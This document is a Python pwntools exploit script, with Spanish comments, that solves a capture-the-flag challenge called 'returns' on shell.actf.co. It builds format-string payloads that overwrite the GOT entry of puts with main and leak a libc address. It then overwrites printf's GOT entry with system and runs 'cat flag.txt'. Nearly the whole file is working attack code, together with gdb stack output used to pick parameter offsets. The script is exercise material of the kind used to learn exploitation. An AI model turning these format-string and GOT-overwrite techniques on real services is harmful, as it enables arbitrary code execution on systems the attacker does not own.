#coding:utf-8

from pwn import *
from time import sleep
import sys

PATH = "./returns"
REMOTE = False
DEBUG = False  # Start with 'python exploit.py NOPTRACE' for no debugging

######
# BUSCAR INFO EN EL EJECUTABLE Y LAS LIBRERÍAS
######

# De forma manual
MAIN_ADDR =     0x4011a6  # objdump -d returns | grep main
GOT_PUTS =      0x404018  # readelf --relocs returns / objdump -R returns | grep puts
GOT_PRINTF =    0x404038  # readelf --relocs returns / objdump -R returns | grep printf

# Utilizando las librerías de pwntools
e = ELF ("./returns")
main_addr = e.sym['main'] # 0x4011a6 pasado a int es: 4198822
got_puts = e.got['puts']  # 0x404018 (readelf --relocs returns | grep puts)
got_printf = e.got['printf']

log.info("got_puts: \t" + str(hex(got_puts)))
log.info("got_puts: \t" + str(hex(got_printf)))
log.info("main_addr: \t" + str(hex(main_addr)))

### ARRANQUE DEL EJECUTABLE Y CALCULO DE OFFSETS EN LIBC

if REMOTE:
    l = ELF ("./libc.so.6")
    p = remote("shell.actf.co", 19307)
    
else:
    l = ELF ("/lib/x86_64-linux-gnu/libc.so.6")
    p = process(PATH)

# En el caso de la KALI de Hacking ético tenemos que la librería es GLIBC.2.29
# Los offsets para esta librería son (calculo manual):
#OFFSET_LIBC_START_MAIN = 0x26ad0
#OFFSET_LIBC_SYSTEM     = 0x46ff0

# Y si lo calculamos de forma automática con pwntools
OFFSET_LIBC_START_MAIN = l.sym['__libc_start_main']
OFFSET_LIBC_SYSTEM = l.sym['__libc_system']

log.info("__libc_start_main: \t" + str(hex(OFFSET_LIBC_START_MAIN)))
log.info("__libc_system: \t" + str(hex(l.sym['__libc_system'])))
pause()

#### ARRANQUE DEL TRACEADOR. SI NO SE QUIERE ARRANCAR HAY QUE EJECUTAR:
#  python exploit.py  NOPTRACE

if DEBUG:
    attach(p,'''
    break *main + 252
    continue
    stack 20
    ''')

##### START OF EXPLOIT
#Stage 1: overwrite GOT entry of puts with address of main, and leak.
log.info ("START OF STAGE 1")
p.recv()

# Construccion del payload.

# ESCRITURA EN GOT DE PUTS CON EL VALOR DE MAIN_ADDR DEL PROGRAMA PARA CONSEGUIR QUE HAGA UN BUCLE 
# Ponemos en el parámetro 12 el valor de GOT_PUTS y luego lo escribimos
# el valor de main_addr = 0x4011a6 = 4198822 caracteres.

# Hay que tener en cuenta que el programa returns machaca el último caracter antes del primer \0
# ya que strlen busca el primer \0 y por eso insertamos una "a"

# Por otro lado, aprovechamos y hacemos el leak de la dirección __libc_start_main_ret para saber en qué 
# dirección se ha cargado la libc. Con PEDA ponemos un breakpoint en *main + 252 (printf) y miramos el stack 
# (comando stack 20 en gdb). Nos dice: 
# 0016| 0x7fffffffe200 ("AAAAAAAA")
# 0024| 0x7fffffffe208 --> 0x400000 --> 0x10102464c457f 
# 0032| 0x7fffffffe210 --> 0x0 
# 0040| 0x7fffffffe218 --> 0x0 
# 0048| 0x7fffffffe220 --> 0x401330 (<__libc_csu_init>:   repz nop edx)
# 0056| 0x7fffffffe228 --> 0x4010c0 (<_start>:    repz nop edx)
# 0064| 0x7fffffffe230 --> 0x7fffffffe320 --> 0x1 
# 0072| 0x7fffffffe238 --> 0xf6758615e3613500 
# 0080| 0x7fffffffe240 --> 0x401330 (<__libc_csu_init>:   repz nop edx)
# 0088| 0x7fffffffe248 --> 0x7ffff7e15bbb (<__libc_start_main+235>:       mov    edi,eax)
#
# Considerando que el parámetro 8 es el que nos muestra las AAAAAAA, vemos que la línea con __libc_start_main+235 estará
# en la posición correspondiente al parámetro 17. Por eso tendremos que hacer el printado de dicho parámetro con %17$p

payload  = ""
payload += "%4198822x%12$n|%17$p|"  
payload += "a"  #Nota: esta última "a" la machaca con la línea: item[strlen(item)-1] = 0;
payload += "\x00"*(32-len(payload))
payload += "\x18\x40\x40\x00\x00\x00\x00\x00"  # Entra en el parámetro 12.

# ALTERNATIVA 2. Escribiendo byte a byte es más rápido porque no hay que escribir tantos dígitos con %x
# Valor del byte en got_puts+1 (param 12) = 0x11 (17). Valor para got_put (param 13): 0xa6-0x11 (166-17 = 149)
# El tercer byte de main_addr (0x40) no hay que modificarlo porque su valor es el que necesitamos. 

payload  = ""
payload += "%17x%12$hhn%149x%13$hhn|%17$p|"
payload += "a" # para que la machaque la línea: item[strlen(item)-1] = 0;
payload += "\x00" * (32-len(payload)) # rellenamos con padding hasta que haya 32 bytes (4 parámetros)
payload += p64(got_puts+1) # parametro 12
payload += p64(got_puts)   # parametro 13

#log.info("Payload: " + hexdump(payload))
#log.info("Length: " + str(len(payload)))
p.sendline(payload)

sleep(0.1)
leak = p.recvuntil(". You").split("|")
log.info("Leak of libc address (__libc_start_main + 235): " + str(leak[1]))

# Y ahora calculamos la dirección donde esta la función SYSTEM en LIBC, utilizando el leak

LIBC_RET_TO_START_MAIN = int(leak[1],16)
LIBC_BASE = LIBC_RET_TO_START_MAIN - (OFFSET_LIBC_START_MAIN + 235)
SYSTEM_ADDR = LIBC_BASE + OFFSET_LIBC_SYSTEM
log.info("System addr (libc): " + hex(SYSTEM_ADDR))
pause()

########  STAGE 2
# Stage 2: overwrite GOT entry of printf with system
# Hay solo 50 bytes de payload, por eso en vez de byte a byte he tenido que hacerlo
# de 2 bytes en 2 bytes, y escribiendo solo los ultimos 4 bytes porque son los únicos que cambian
# entre dos funciones dentro de la librería libc
p.recvuntil("return? ")
# Escribimos en GOT_PRINTF la dirección de system
log.info("Writing got_printf (" + str(hex(got_printf)) + ") with value " + str(hex(SYSTEM_ADDR))) 

writes = {}
#writes2 = {}
for i in range (2):
	writes[got_printf+i*2] = (SYSTEM_ADDR >> (16 * i)) & 0xFFFF
	#writes2[hex(got_printf+i*2)] = hex((SYSTEM_ADDR >> (16 * i)) & 0xFFFF) # Solo para imprimir en hex

#log.info("Información a escribir: ")
#print writes2

offset  = 12
payload = ''
n = 0
for (i, addr) in enumerate(writes):
	w = (writes[addr]-n)%0x10000
	payload +='%{}x%{}$hn'.format(w, offset+i)
	n += w

payload += "A"
assert (len(payload)<32)
payload += "\x00"* (32-len(payload))
for addr in writes:
	payload+=p64(addr)
assert (len(payload)<50)

#print (payload)
pause()


#log.info("Payload: " + hexdump(payload))
#log.info("Len: " + str(len(payload)))
if len(payload) > 50:
    log.failure("Long payload")
    sys.exit()


p.sendline(payload)
p.recv()
p.sendline("cat flag.txt")
#p.interactive()
p.recvuntil("string")
p.recvline()
print ("EL FLAG ENCONTRADO ES: ")
print (p.recvline())
